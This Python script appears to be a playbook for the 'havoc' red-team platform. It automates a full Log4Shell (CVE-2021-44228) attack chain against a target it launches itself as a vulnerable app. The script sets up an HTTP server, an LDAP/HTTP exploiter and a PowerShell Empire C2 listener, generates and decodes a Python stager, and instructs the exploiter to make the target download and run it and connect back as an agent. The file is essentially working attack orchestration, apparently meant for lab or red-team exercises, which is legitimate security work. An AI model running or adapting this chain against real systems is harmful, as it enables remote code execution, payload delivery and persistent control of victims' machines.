# Import the supporting Python packages.
import re
import os
import string
import random
import pprint
import argparse
import subprocess
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - cve-2021-44228 exploit and C2')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/cve_2021_44228_exploit_and_c2/cve_2021_44228_exploit_and_c2.ini')

use_cloud_attack_tasks = config.get('general', 'use_cloud_attack_tasks')
c2_task_name = config.get('general', 'remote_c2_task_name')
http_server_task_name = config.get('general', 'remote_http_server_task_name')
exploiter_task_name = config.get('general', 'remote_cve_2021_44228_exploit_task_name')
c2_listener_type = config.get('c2_task', 'listener_type')
c2_listener_profile = config.get('c2_task', 'listener_profile')
c2_listener_port = config.get('c2_task', 'listener_port')
c2_listener_tls = config.get('c2_task', 'listener_tls')
c2_domain_name = config.get('c2_task', 'domain_name')
c2_cert_subj = config.get('c2_task', 'cert_subj')
c2_stager_file = config.get('c2_task', 'stager_file')
http_server_port = config.get('http_server_task', 'http_port')
http_server_ssl = config.get('http_server_task', 'ssl')
http_server_domain_name = config.get('http_server_task', 'domain_name')
exploiter_http_port = config.get('cve_2021_44228_exploit_task', 'http_port')
exploiter_ldap_port = config.get('cve_2021_44228_exploit_task', 'ldap_port')
exploiter_domain_name = config.get('cve_2021_44228_exploit_task', 'domain_name')
exploiter_exec_cmd = config.get('cve_2021_44228_exploit_task', 'exec_cmd')
vuln_app_task_name = config.get('remote_cve_2021_44228_app_task', 'task_name')
vuln_app_java_version = config.get('remote_cve_2021_44228_app_task', 'java_version')
vuln_app_target_port = config.get('remote_cve_2021_44228_app_task', 'target_port')

if c2_listener_profile != 'None':
    resource_name = c2_listener_profile
else:
    resource_name = f'c2-{c2_listener_type}'

def get_task_attack_ip(tn):
    task_details = h.get_task(tn)
    task_attack_ip = task_details['attack_ip']
    return task_attack_ip


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


def clean_up():
    if http_server_exists:
        print(f'\nShutting down HTTP server task {http_server_exists}.\n')
        http_server_task_shutdown_response = h.task_shutdown(http_server_exists)
        if 'completed' not in http_server_task_shutdown_response:
            print(f'Task shutdown for {http_server_exists} failed.\n')
            print(http_server_task_shutdown_response)

    if exploiter_exists:
        print(f'\nShutting down exploiter task {exploiter_exists}.\n')
        exploiter_task_shutdown_response = h.instruct_task(exploiter_exists)
        if 'completed' not in exploiter_task_shutdown_response:
            print(f'Task shutdown for {exploiter_exists} failed.\n')
            print(exploiter_task_shutdown_response)

    if agent_exists:
        print(f'\nSending kill command to agent with name {agent_exists[0]}.\n')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_agent'
        agent_name = agent_exists[0]
        instruct_args = {'Name': f'{agent_name}'}
        kill_agent_response = h.interact_with_task(agent_exists[2], instruct_instance, instruct_command, instruct_args)
        if 'result' in kill_agent_response and kill_agent_response['result'] == 'failed':
            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
            print(kill_agent_response)

    if c2_listener_exists and not c2_task_exists:
        print(f'\nKilling listener {c2_listener_exists[1]}.\n')
        instruct_instance = 'clean_up'
        instruct_command = 'kill_listener'
        instruct_args = {'Name': c2_listener_exists[1]}
        kill_listener_response = h.interact_with_task(
            c2_listener_exists[0], instruct_instance, instruct_command, instruct_args
        )
        if 'result' in kill_listener_response and kill_listener_response['result'] == 'failed':
            print(f'Failed to kill listener {c2_listener_exists[1]}.\n')
            print(kill_listener_response)

    if c2_task_exists:
        print(f'\nShutting down C2 task {c2_task_exists}.\n')
        c2_task_shutdown_response = h.task_shutdown(c2_task_exists)
        if 'completed' not in c2_task_shutdown_response:
            print(f'Task shutdown for {c2_task_exists} failed.\n')
            print(c2_task_shutdown_response)

    if stager_exists:
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.\n')
        h.delete_file(stager_exists)
        os.remove(stager_exists)

    if cve_exists:
        print(f'\nKilling the cve-2021-44228 vulnerable app on {cve_exists[0]}.')
        instruct_instance = cve_exists[1]
        instruct_command = 'stop_cve_2021_44228_app'
        stop_app_response = h.interact_with_task(cve_exists[0], instruct_instance, instruct_command)
        if 'result' in stop_app_response and stop_app_response['result'] == 'failed':
            print(f'Failed to kill cve-2021-44228 vulnerable app on {cve_exists[0]}.\n')
            print(stop_app_response)

    if http_portgroup_exists:
        print(f'\nDeleting the {http_portgroup_exists} portgroup.\n')
        h.delete_portgroup(http_portgroup_exists)

    if exploiter_portgroup_exists:
        print(f'\nDeleting the {exploiter_portgroup_exists} portgroup.\n')
        h.delete_portgroup(exploiter_portgroup_exists)

    if c2_portgroup_exists:
        print(f'\nDeleting the {c2_portgroup_exists} portgroup.\n')
        h.delete_portgroup(c2_portgroup_exists)

    exit('\nDone... Exiting.\n')


# Verify cve_2021_44228_app_task_name exists
print(f'\nVerifying that trainman task {vuln_app_task_name} exists.')
target_ip = None
task_list = h.list_tasks()
if vuln_app_task_name in task_list['tasks']:
    if use_cloud_attack_tasks == 'True':
        target_ip = get_task_attack_ip(vuln_app_task_name)
    else:
        target_ip = get_task_target_ip(vuln_app_task_name)
else:
    exit(f'\nTrainman task {vuln_app_task_name} does not exist. Exiting...')

if use_cloud_attack_tasks == 'True':
    # Create a portgroup for the HTTP server task.
    print(f'\nCreating a portgroup for the HTTP server.')
    h.create_portgroup('http_server', f'Allows port {http_server_port} traffic')
    print(f'\nAdding portgroup rule to allow {vuln_app_task_name} task target IP {target_ip} to reach '
          f'port {http_server_port}.\n')
    h.update_portgroup_rule('http_server', 'add', f'{target_ip}/32', http_server_port, 'tcp')
    http_portgroup_exists = 'http_server'

    # Create a portgroup for the exploiter task's HTTP and LDAP ports.
    print(f'\nCreating a portgroup for the exploiter task.')
    h.create_portgroup('exploiter', f'Allows port {exploiter_http_port} and port {exploiter_ldap_port} traffic')
    print(f'\nAdding portgroup rule to allow {vuln_app_task_name} task target IP {target_ip} to reach '
          f'port {exploiter_http_port}.\n')
    h.update_portgroup_rule('exploiter', 'add', f'{target_ip}/32', exploiter_http_port, 'tcp')
    print(f'\nAdding portgroup rule to allow {vuln_app_task_name} task target IP {target_ip} to reach '
          f'port {exploiter_ldap_port}.\n')
    h.update_portgroup_rule('exploiter', 'add', f'{target_ip}/32', exploiter_ldap_port, 'tcp')
    exploiter_portgroup_exists = 'exploiter'

    # Create a portgroup for the powershell_empire task's listener.
    print(f'\nCreating a portgroup for {resource_name} listener.')
    h.create_portgroup(resource_name, f'Allows port {c2_listener_port} traffic')
    print(f'\nAdding portgroup rule to allow {vuln_app_task_name} task target IP {target_ip} to reach '
          f'{resource_name} listener on port {c2_listener_port}.\n')
    h.update_portgroup_rule(resource_name, 'add', f'{target_ip}/32', c2_listener_port, 'tcp')
    c2_portgroup_exists = resource_name

    # Launch an http_server task.
    http_server_task_name = f'http_server_{sdate}'
    portgroups = ['http_server']
    if http_server_domain_name == 'None':
        http_server_task_host_name = 'None'
    else:
        http_server_task_host_name = 'www'
    print(f'\nLaunching http_server task with name {http_server_task_name}.')
    http_server_task = h.task_startup(
        http_server_task_name,
        'http_server',
        task_host_name=http_server_task_host_name,
        task_domain_name=http_server_domain_name,
        portgroups=portgroups
    )
    http_server_exists = http_server_task_name
    http_server_task_ip = http_server_task['attack_ip']
    print(f'\nThe http_server task is ready with the following parameters:')
    print(f'\nIP - {http_server_task_ip}')
    print(f'\nHost name - {http_server_task_host_name}')
    print(f'\nDomain name - {http_server_domain_name}')

    # Launch an exploiter task.
    exploiter_task_name = f'cve_2021_44228_exploiter_{sdate}'
    portgroups = ['exploiter']
    if exploiter_domain_name == 'None':
        exploiter_task_host_name = 'None'
    else:
        exploiter_task_host_name = 'cve-2021-44228-exploiter'
    print(f'\nLaunching cve_2021_44228_exploiter task with name {exploiter_task_name}.')
    exploiter_task = h.task_startup(
        exploiter_task_name,
        'trainman',
        task_host_name=exploiter_task_host_name,
        task_domain_name=exploiter_domain_name,
        portgroups=portgroups
    )
    exploiter_exists = exploiter_task_name
    exploiter_task_ip = exploiter_task['attack_ip']
    print(f'\nThe exploiter task is ready with the following parameters:')
    print(f'\nIP - {exploiter_task_ip}')
    print(f'\nHost name - {exploiter_task_host_name}')
    print(f'\nDomain name - {exploiter_domain_name}')

    # Launch a powershell_empire task for the listener.
    c2_task_name = f'{resource_name}_{sdate}'
    portgroups = [resource_name]
    if c2_domain_name == 'None':
        c2_task_host_name = 'None'
    else:
        c2_task_host_name = resource_name
    print(f'\nLaunching powershell_empire task with name {c2_task_name}.')
    c2_task = h.task_startup(
        c2_task_name,
        'powershell_empire',
        task_host_name=c2_task_host_name,
        task_domain_name=c2_domain_name,
        portgroups=portgroups
    )
    c2_task_exists = c2_task_name
    c2_task_ip = c2_task['attack_ip']
    print(f'\nThe powershell_empire task is ready with the following parameters:')
    print(f'\nIP - {c2_task_ip}')
    print(f'\nHost name - {c2_task_host_name}')
    print(f'\nDomain name - {c2_domain_name}')
else:
    http_server_task_ip = get_task_target_ip(http_server_task_name)
    http_server_task_host_name = 'None'
    exploiter_task_ip = get_task_target_ip(exploiter_task_name)
    exploiter_task_host_name = 'None'
    c2_task_ip = get_task_target_ip(c2_task_name)

# Use a random string for the PowerShell Empire instruct_instance.
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested, generate a certificate.
if c2_listener_tls == 'yes':
    subj = None
    if c2_domain_name != 'None':
        subj = re.sub('\$HOST', f'{resource_name}.{c2_domain_name}', c2_cert_subj)
    if c2_domain_name == 'None':
        subj = re.sub('\$HOST', f'{c2_task_ip}', c2_cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    cert_gen = h.interact_with_task(c2_task_name, c2_instruct_instance, instruct_command, instruct_args)
    if cert_gen['outcome'] == 'success':
        print('\ncert_gen succeeded.\n')
    else:
        print('\ncert_gen failed... Exiting.\n')
        clean_up()

# Create a listener for the powershell_empire task.
print(f'\nCreating {resource_name} listener on {c2_task_name} task.')
if c2_listener_tls == 'yes':
    c2_listener_protocol = 'https'
else:
    c2_listener_protocol = 'http'
if c2_domain_name != 'None':
    c2_listener_host = f'{c2_listener_protocol}://{resource_name}.{c2_domain_name}:{c2_listener_port}'
else:
    c2_listener_host = f'{c2_listener_protocol}://{c2_task_ip}:{c2_listener_port}'
instruct_command = 'create_listener'
instruct_args = {
        'listener_type': c2_listener_type,
        'Name': f'{resource_name}',
        'Host': c2_listener_host,
        'Port': c2_listener_port
    }
if c2_listener_type == 'http_malleable' and c2_listener_profile != 'None':
    instruct_args['Profile'] = f'{c2_listener_profile}.profile'
if c2_listener_tls == 'yes':
    instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
create_listener = h.interact_with_task(c2_task_name, c2_instruct_instance, instruct_command, instruct_args)
if create_listener['outcome'] == 'success':
    print('\ncreate_listener succeeded.\n')
    c2_listener_exists = [c2_task_name, c2_instruct_instance]
else:
    print('\ncreate_listener failed... Exiting.\n')
    clean_up()

# Generate a stager for the listener.
print(f'\nGenerating a stager for the {resource_name} listener.')
instruct_command = 'create_stager'
instruct_args = {
    'Listener': f'{resource_name}',
    'StagerName': 'multi/launcher',
    'Language': 'python',
    'OutFile': f'{c2_stager_file}'
}
create_stager = h.interact_with_task(c2_task_name, c2_instruct_instance, instruct_command, instruct_args)
if create_stager['outcome'] == 'success':
    print('\ncreate_stager succeeded.\n')
else:
    print('\ncreate_stager failed... Exiting.\n')
    clean_up()
output = create_stager['stager']['multi/launcher']['Output']
subprocess.call(f'echo {output} | base64 -d > {c2_stager_file}', shell=True)

# Upload the stager file to the shared workspace
print('\nUploading the stager file to the shared workspace.')
f = open(f'{c2_stager_file}', 'rb')
raw_file = f.read()
h.create_file(f'{c2_stager_file}', raw_file)
stager_exists = f'{c2_stager_file}'

# Use a random string for the http_server instruct_instance.
http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Make sure there isn't an existing stager file with the same name on the http_server task.
print(f'\nDeleting any existing {c2_stager_file} stager from http_server task {http_server_task_name}.')
instruct_command = 'del'
instruct_args = {'file_name': f'{c2_stager_file}'}
delete_old_stager = h.instruct_task(http_server_task_name, http_instruct_instance, instruct_command, instruct_args)
if delete_old_stager['outcome'] == 'success':
    print('\nFile delete request succeeded.\n')
else:
    print('\nNo existing file was present. Proceeding...\n')

# Ask the http_server task to sync it's local workspace from the shared workspace.
print(f'\nDownloading stager file from shared workspace to {http_server_task_name} task local workspace.')
instruct_command = 'sync_from_workspace'
http_sync = h.interact_with_task(http_server_task_name, http_instruct_instance, instruct_command)
if http_sync['outcome'] == 'success':
    print('\nsync_from_workspace succeeded.\n')
else:
    print('\nsync_from_workspace failed... Exiting.\n')
    clean_up()

# Ask the http_server task to start a web service.
print(f'\nStarting a web service on {http_server_task_name}.')
instruct_args = {'listen_port': int(http_server_port), 'ssl': http_server_ssl}
instruct_command = 'start_server'
http_service = h.interact_with_task(http_server_task_name, http_instruct_instance, instruct_command, instruct_args)
if http_service['outcome'] == 'success':
    print('\nstart_server succeeded.\n')
    http_service_exists = [http_server_task_name, http_instruct_instance]
else:
    print('\nstart_server failed... Exiting.\n')
    clean_up()

# Use a random string for the cve_2021_44228_app task instruct_instance.
cve_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the cve_2021_44228_app task to start a vulnerable app.
print(f'\nStarting a cve-2021-44228 vulnerable application on {vuln_app_task_name}.')
instruct_args = {'java_version': vuln_app_java_version, 'listen_port': vuln_app_target_port}
instruct_command = 'start_cve_2021_44228_app'
vuln_app = h.instruct_task(vuln_app_task_name, cve_instruct_instance, instruct_command, instruct_args)
cve_exists = [vuln_app_task_name, cve_instruct_instance]
if vuln_app['outcome'] == 'success':
    print('\nstart_cve_2021_44228_app succeeded.\n')
else:
    print('\nstart_cve_2021_44228_app failed... Exiting.\n')
    clean_up()

if use_cloud_attack_tasks == 'True':
    # Verify that the target IP can be reached by the exploiter task's attack IP.
    print(f'Please enter a firewall exception that allows {exploiter_task_name} IP {exploiter_task_ip} to access '
          f'{vuln_app_task_name} IP {target_ip} on port {vuln_app_target_port}.')
    print('Press enter to proceed.')
    input()

# Use a random string for the cve_2021_44228_app task instruct_instance.
exploit_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the exploiter task to execute the exploit against the target IP.
print(f'\nInstructing exploiter task {exploiter_task_name} to execute exploit and launch {c2_stager_file}.')
if http_server_domain_name == 'None':
    http_server_fqdn = http_server_task_ip
else:
    http_server_fqdn = f'{http_server_task_host_name}.{http_server_domain_name}'
http_server_insert = re.sub('\$HTTP_SERVER_TASK', http_server_fqdn, exploiter_exec_cmd)
new_exec_cmd = re.sub('\$STAGER_FILE', c2_stager_file, http_server_insert)
if exploiter_task_host_name == 'None':
    callback = exploiter_task_ip
else:
    callback = f'{exploiter_task_host_name}.{exploiter_domain_name}'
target_url = f'http://{target_ip}:{vuln_app_target_port}'
instruct_args = {
    'callback': callback,
    'target_url': target_url,
    'http_port': exploiter_http_port,
    'ldap_port': exploiter_ldap_port,
    'exec_cmd': new_exec_cmd
}
instruct_command = 'exploit_cve_2021_44228'
exploit = h.instruct_task(exploiter_task_name, exploit_instruct_instance, instruct_command, instruct_args)
if exploit['outcome'] == 'success':
    print('\nexploit_cve_2021_44228 request succeeded.\n')
else:
    print('\nexploit_cve_2021_44228 request failed... Exiting.\n')
    clean_up()

# Use a random string for the agent instruct_instance.
agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

print(f'\nWaiting for an agent connection on task {c2_task_name}.\n')
try:
    wait_for_c2_response = h.wait_for_c2(c2_task_name)
    agent_name = wait_for_c2_response['agent_info']['name']
    agent_exists = [agent_name, agent_instruct_instance, c2_task_name]
    print(f'Agent connected with name {agent_name}\n')
except KeyboardInterrupt:
    print('Wait for agent operation interrupted. No agent connected. Exiting...')
    clean_up()

print('\nAn agent is connected. Playbook will halt until prompted to clean up.')
print('\nPress enter to proceed with clean up.')
input()

# Playbook is complete; time to clean up.
print('\nPlaybook operation completed. Cleaning up ./havoc resources.')
clean_up()
